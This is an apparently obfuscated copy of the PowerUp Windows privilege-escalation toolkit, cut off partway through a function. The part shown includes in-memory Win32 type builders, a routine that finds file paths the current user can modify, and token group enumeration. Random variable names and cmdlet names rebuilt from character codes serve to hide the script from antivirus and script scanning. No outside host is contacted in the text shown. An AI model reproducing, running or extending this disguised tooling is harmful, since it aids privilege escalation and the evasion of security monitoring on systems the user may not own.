












function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jxmJKsPCaZlOB8FRywQ = [Guid]::NewGuid().ToString()
    )

    $D3moQ5Qsmq = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($BpZKcilASnhDR0mHwzFy, @())
    $N1nevHrmph0tUZ22 = $D3moQ5Qsmq.GetAssemblies()

    foreach ($gmcDki93j06NZBySUMbaPXs in $N1nevHrmph0tUZ22) {
        if ($gmcDki93j06NZBySUMbaPXs.FullName -and ($gmcDki93j06NZBySUMbaPXs.FullName.Split(',')[0] -eq $jxmJKsPCaZlOB8FRywQ)) {
            return $gmcDki93j06NZBySUMbaPXs
        }
    }

    $WwQbg = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Reflection.AssemblyName($jxmJKsPCaZlOB8FRywQ)
    $1Q = $D3moQ5Qsmq
    $RB6L6z4 = $1Q.DefineDynamicAssembly($WwQbg, 'Run')
    $T6s4q8P9BOTP = $RB6L6z4.DefineDynamicModule($jxmJKsPCaZlOB8FRywQ, $False)

    return $T6s4q8P9BOTP
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $FCejPX3LWdUJ6ygaw98Zs = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $FCejPX3LWdUJ6ygaw98Zs['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $FCejPX3LWdUJ6ygaw98Zs['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $FCejPX3LWdUJ6ygaw98Zs['Charset'] = $Charset }
    if ($SetLastError) { $FCejPX3LWdUJ6ygaw98Zs['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $FCejPX3LWdUJ6ygaw98Zs['EntryPoint'] = $EntryPoint }

    & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject -Property $FCejPX3LWdUJ6ygaw98Zs
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TmNFlOCtGHriQS = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TmNFlOCtGHriQS[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TmNFlOCtGHriQS[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TmNFlOCtGHriQS.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TmNFlOCtGHriQS[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TmNFlOCtGHriQS[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $7p8dVJB5hXEKQCbuZI4N = $TmNFlOCtGHriQS[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            
            $8iqF = 1
            foreach($qkDHgCVJGWfcL6SA in $ParameterTypes)
            {
                if ($qkDHgCVJGWfcL6SA.IsByRef)
                {
                    [void] $7p8dVJB5hXEKQCbuZI4N.DefineParameter($8iqF, 'Out', $BpZKcilASnhDR0mHwzFy)
                }

                $8iqF++
            }

            $Nn7XpUdcfASi56q = [Runtime.InteropServices.DllImportAttribute]
            $r82JZEL4l = $Nn7XpUdcfASi56q.GetField('SetLastError')
            $9N0lKhIfoPWuAeH = $Nn7XpUdcfASi56q.GetField('CallingConvention')
            $o60e = $Nn7XpUdcfASi56q.GetField('CharSet')
            $7bhYQdCMsngOFXKzvU9 = $Nn7XpUdcfASi56q.GetField('EntryPoint')
            if ($SetLastError) { $oMcZgnT7sIErQFzl = $True } else { $oMcZgnT7sIErQFzl = $False }

            if ($PSBoundParameters['EntryPoint']) { $mNAEGBkHIJKl6hg = $EntryPoint } else { $mNAEGBkHIJKl6hg = $FunctionName }

            
            $l43RwS5XYn6uFEDoz8IAdQTs = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $h8iewmi65dzvIAnWN1s = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Reflection.Emit.CustomAttributeBuilder($l43RwS5XYn6uFEDoz8IAdQTs,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($r82JZEL4l,
                                           $9N0lKhIfoPWuAeH,
                                           $o60e,
                                           $7bhYQdCMsngOFXKzvU9),
                [Object[]] @($oMcZgnT7sIErQFzl,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $mNAEGBkHIJKl6hg))

            $7p8dVJB5hXEKQCbuZI4N.SetCustomAttribute($h8iewmi65dzvIAnWN1s)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TmNFlOCtGHriQS
        }

        $DvwBW = @{}

        foreach ($aJDCNko6P2 in $TmNFlOCtGHriQS.Keys)
        {
            $Nz6z26Uho2Yb7JB = $TmNFlOCtGHriQS[$aJDCNko6P2].CreateType()

            $DvwBW[$aJDCNko6P2] = $Nz6z26Uho2Yb7JB
        }

        return $DvwBW
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $rte10iThFAsSaw,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Nz6z26Uho2Yb7JB,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Q1Y7EotHPi6nxyJ2elBgN,

        [Switch]
        $kTTNmmcQEI
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($rte10iThFAsSaw))
    }

    $hagnBekUZ = $Nz6z26Uho2Yb7JB -as [Type]

    $49HZ6oyg2k7fte3C1lxLjdFI = $Module.DefineEnum($rte10iThFAsSaw, 'Public', $hagnBekUZ)

    if ($kTTNmmcQEI)
    {
        $B0VGY3X6yUMK = [FlagsAttribute].GetConstructor(@())
        $mROymM4Eq7LDQjkdhI = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Reflection.Emit.CustomAttributeBuilder($B0VGY3X6yUMK, @())
        $49HZ6oyg2k7fte3C1lxLjdFI.SetCustomAttribute($mROymM4Eq7LDQjkdhI)
    }

    foreach ($aJDCNko6P2 in $Q1Y7EotHPi6nxyJ2elBgN.Keys)
    {
        
        $BpZKcilASnhDR0mHwzFy = $49HZ6oyg2k7fte3C1lxLjdFI.DefineLiteral($aJDCNko6P2, $Q1Y7EotHPi6nxyJ2elBgN[$aJDCNko6P2] -as $hagnBekUZ)
    }

    $49HZ6oyg2k7fte3C1lxLjdFI.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Nz6z26Uho2Yb7JB,

        [Parameter(Position = 2)]
        [UInt16]
        $atJ8L0hxwUgFYr3xCyY4X,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Nz6z26Uho2Yb7JB -as [Type]
        Offset = $atJ8L0hxwUgFYr3xCyY4X
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $rte10iThFAsSaw,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $wxjzPGBAVucod0geQi,

        [Reflection.Emit.PackingSize]
        $h6qyAmExwN2YtQ = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $fB87e4UhO0c
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($rte10iThFAsSaw))
    }

    [Reflection.TypeAttributes] $hKRHdF164Nu = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($fB87e4UhO0c)
    {
        $hKRHdF164Nu = $hKRHdF164Nu -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $hKRHdF164Nu = $hKRHdF164Nu -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $q5kPDcJdr03Z9I = $Module.DefineType($rte10iThFAsSaw, $hKRHdF164Nu, [ValueType], $h6qyAmExwN2YtQ)
    $kjc1Md6bpDqSrTi = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $OSPRpkpzQ4JjCfQJHDwlg = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $ZjgT3 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Hashtable[]($wxjzPGBAVucod0geQi.Count)

    
    
    
    foreach ($9Ut6ANlruX3KZ8nodx in $wxjzPGBAVucod0geQi.Keys)
    {
        $mkmfzP47elbOLr48y08 = $wxjzPGBAVucod0geQi[$9Ut6ANlruX3KZ8nodx]['Position']
        $ZjgT3[$mkmfzP47elbOLr48y08] = @{FieldName = $9Ut6ANlruX3KZ8nodx; Properties = $wxjzPGBAVucod0geQi[$9Ut6ANlruX3KZ8nodx]}
    }

    foreach ($9Ut6ANlruX3KZ8nodx in $ZjgT3)
    {
        $WxvuH3QLKtwdUZTMs = $9Ut6ANlruX3KZ8nodx['FieldName']
        $aEn = $9Ut6ANlruX3KZ8nodx['Properties']

        $atJ8L0hxwUgFYr3xCyY4X = $aEn['Offset']
        $Nz6z26Uho2Yb7JB = $aEn['Type']
        $MarshalAs = $aEn['MarshalAs']

        $65Owr2uIB7dhWMXanPbpVx = $q5kPDcJdr03Z9I.DefineField($WxvuH3QLKtwdUZTMs, $Nz6z26Uho2Yb7JB, 'Public')

        if ($MarshalAs)
        {
            $sdJ46glUQLzMWRFXqjNBS = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $w9QRESvWkbmBpGxVfJK51HdM = $MarshalAs[1]
                $KY5izhXM9aB0UbWqT4 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Reflection.Emit.CustomAttributeBuilder($kjc1Md6bpDqSrTi,
                    $sdJ46glUQLzMWRFXqjNBS, $OSPRpkpzQ4JjCfQJHDwlg, @($w9QRESvWkbmBpGxVfJK51HdM))
            }
            else
            {
                $KY5izhXM9aB0UbWqT4 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Reflection.Emit.CustomAttributeBuilder($kjc1Md6bpDqSrTi, [Object[]] @($sdJ46glUQLzMWRFXqjNBS))
            }

            $65Owr2uIB7dhWMXanPbpVx.SetCustomAttribute($KY5izhXM9aB0UbWqT4)
        }

        if ($fB87e4UhO0c) { $65Owr2uIB7dhWMXanPbpVx.SetOffset($atJ8L0hxwUgFYr3xCyY4X) }
    }

    
    
    $kIZC6rEuatmrXZK1v = $q5kPDcJdr03Z9I.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $IzoETMpXjN7KiVFfu = $kIZC6rEuatmrXZK1v.GetILGenerator()
    
    $IzoETMpXjN7KiVFfu.Emit([Reflection.Emit.OpCodes]::Ldtoken, $q5kPDcJdr03Z9I)
    $IzoETMpXjN7KiVFfu.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $IzoETMpXjN7KiVFfu.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $IzoETMpXjN7KiVFfu.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $Jb6WgdO = $q5kPDcJdr03Z9I.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $q5kPDcJdr03Z9I,
        [Type[]] @([IntPtr]))
    $64RMNCnjQuh339 = $Jb6WgdO.GetILGenerator()
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Nop)
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Ldtoken, $q5kPDcJdr03Z9I)
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $q5kPDcJdr03Z9I)
    $64RMNCnjQuh339.Emit([Reflection.Emit.OpCodes]::Ret)

    $q5kPDcJdr03Z9I.CreateType()
}








function Get-ModifiablePath {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $b3CtzFF8zYowylvWrqwrJZd,

        [Alias('LiteralPaths')]
        [Switch]
        $d41WGJ3bP2VD
    )

    BEGIN {
        
        $Ghyotkw = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $4Qerja = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $G0 = $4Qerja.Groups | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Value
        $G0 += $4Qerja.User.Value
        $fAGb2sTKOlf9GLi0L = @{}
    }

    PROCESS {

        ForEach($bZ9oT7u0OmQfwAIRiMqgtC in $b3CtzFF8zYowylvWrqwrJZd) {

            $A0gTxM4f = @()

            
            $4e1FSJad7zyik8lmvB = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if ($PSBoundParameters['Literal']) {

                $YbDiGe8nOItTUPS4MoEYVuS = $([System.Environment]::ExpandEnvironmentVariables($bZ9oT7u0OmQfwAIRiMqgtC))

                if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS -ErrorAction SilentlyContinue) {
                    $A0gTxM4f += & (("P9F7Ved2qvA-byXrBTGCNWuiRnMh0cJEt3lS5Dp1QZ4wa6UsYIKgzx8LkmfOoHj")[24,5,47,60,34,9,5,11,0,44,32,27] -join '') -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Path
                }
                else {
                    
                    $pQFuNA = & ([string]::join('', ( (83,112,108,105,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS -Parent  -ErrorAction SilentlyContinue
                    if ($pQFuNA -and (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $pQFuNA)) {
                        $A0gTxM4f += & (("P9F7Ved2qvA-byXrBTGCNWuiRnMh0cJEt3lS5Dp1QZ4wa6UsYIKgzx8LkmfOoHj")[24,5,47,60,34,9,5,11,0,44,32,27] -join '') -b3CtzFF8zYowylvWrqwrJZd $pQFuNA -ErrorAction SilentlyContinue | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($tyiI9saPg in $4e1FSJad7zyik8lmvB) {
                    $bZ9oT7u0OmQfwAIRiMqgtC.Split($tyiI9saPg) | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_ -and ($_.trim() -ne '')} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

                        if (($tyiI9saPg -notmatch ' ')) {

                            $YbDiGe8nOItTUPS4MoEYVuS = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($YbDiGe8nOItTUPS4MoEYVuS -and ($YbDiGe8nOItTUPS4MoEYVuS -ne '')) {
                                if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS -ErrorAction SilentlyContinue) {
                                    
                                    $A0gTxM4f += & (("P9F7Ved2qvA-byXrBTGCNWuiRnMh0cJEt3lS5Dp1QZ4wa6UsYIKgzx8LkmfOoHj")[24,5,47,60,34,9,5,11,0,44,32,27] -join '') -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Path
                                }

                                else {
                                    
                                    try {
                                        $pQFuNA = (& ([string]::join('', ( (83,112,108,105,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $YbDiGe8nOItTUPS4MoEYVuS -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($pQFuNA -and ($pQFuNA -ne '') -and (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $pQFuNA  -ErrorAction SilentlyContinue)) {
                                            $A0gTxM4f += & (("P9F7Ved2qvA-byXrBTGCNWuiRnMh0cJEt3lS5Dp1QZ4wa6UsYIKgzx8LkmfOoHj")[24,5,47,60,34,9,5,11,0,44,32,27] -join '') -b3CtzFF8zYowylvWrqwrJZd $pQFuNA -ErrorAction SilentlyContinue | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            
                            $A0gTxM4f += & (("P9F7Ved2qvA-byXrBTGCNWuiRnMh0cJEt3lS5Dp1QZ4wa6UsYIKgzx8LkmfOoHj")[24,5,47,60,34,9,5,11,0,44,32,27] -join '') -b3CtzFF8zYowylvWrqwrJZd $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Path | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Trim()} | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {($_ -ne '') -and (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $_)}
                        }
                    }
                }
            }

            $A0gTxM4f | & (("AJ3HQW6zSn4uhLfj7Vwr5CkBpbNxmRDeEGOKo9qMa21vyigtUPsT8cdlIF0Z-YX")[8,36,19,47,60,34,25,15,31,53,47] -join '') -Unique | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                $M7iD0N94ZEgOHhIJeWq = $_
                Get-Acl -b3CtzFF8zYowylvWrqwrJZd $M7iD0N94ZEgOHhIJeWq | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Access | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {($_.AccessControlType -match 'Allow')} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

                    $FJPCeQlcfO52rkXNHKUV3jWuI = $_.FileSystemRights.value__

                    $M9b0cVwaSTxmLWUhv52N78rX = $Ghyotkw.Keys | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { $FJPCeQlcfO52rkXNHKUV3jWuI -band $_ } | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { $Ghyotkw[$_] }

                    
                    $7Jb4 = & (("f-NTVtAyqPQa4vMpk2nlOR5wu09K61Ug8xGrEYhjHo3BZXs7FCSbIzmiLcWJeDd")[49,41,54,15,11,35,60,1,20,51,39,60,57,5] -join '') -ReferenceObject $M9b0cVwaSTxmLWUhv52N78rX -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if ($7Jb4) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if (-not ($fAGb2sTKOlf9GLi0L[$_.IdentityReference])) {
                                
                                $65ZurT8OCMIQDqw = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Security.Principal.NTAccount($_.IdentityReference)
                                $fAGb2sTKOlf9GLi0L[$_.IdentityReference] = $65ZurT8OCMIQDqw.Translate([System.Security.Principal.SecurityIdentifier]) | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Value
                            }
                            $lx924rplN3QnLip3pWdbOWV = $fAGb2sTKOlf9GLi0L[$_.IdentityReference]
                        }
                        else {
                            $lx924rplN3QnLip3pWdbOWV = $_.IdentityReference
                        }

                        if ($G0 -contains $lx924rplN3QnLip3pWdbOWV) {
                            $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiablePath' $M7iD0N94ZEgOHhIJeWq
                            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'IdentityReference' $_.IdentityReference
                            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Permissions' $M9b0cVwaSTxmLWUhv52N78rX
                            $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $MZ8p5YquBs
                        }
                    }
                }
            }
        }
    }
}


function Get-TokenInformation {


    [OutputType('PowerUp.TokenGroup')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $fxZOuNsJK,

        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $I2XPx60LSRcn8 = 'Privileges'
    )

    PROCESS {
        if ($I2XPx60LSRcn8 -eq 'Groups') {
            

            
            $GlTw = 0
            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 2, 0, $GlTw, [ref]$GlTw)
            [IntPtr]$lbo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($GlTw)

            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 2, $lbo, $GlTw, [ref]$GlTw);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($2MIexk) {
                $XdNqZ = $lbo -as $dPqXG0T6Yn7FzL
                For ($8iqF=0; $8iqF -lt $XdNqZ.GroupCount; $8iqF++) {
                    

                    if ($XdNqZ.Groups[$8iqF].SID) {
                        $XAPl1MmaFTRDZ = ''
                        $U51iWlcYNSdtn0ML7 = $m9OcQ7t::ConvertSidToStringSid($XdNqZ.Groups[$8iqF].SID, [ref]$XAPl1MmaFTRDZ);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($U51iWlcYNSdtn0ML7 -eq 0) {
                            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error: $(([ComponentModel.Win32Exception] $orOtbI).Message)"
                        }
                        else {
                            $AqLXSxH = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                            $AqLXSxH | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'SID' $XAPl1MmaFTRDZ
                            
                            $AqLXSxH | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Attributes' ($XdNqZ.Groups[$8iqF].Attributes -as $AsjbtTXzCcel5)
                            $AqLXSxH | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TokenHandle' $fxZOuNsJK
                            $AqLXSxH.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
                            $AqLXSxH
                        }
                    }
                }
            }
            else {
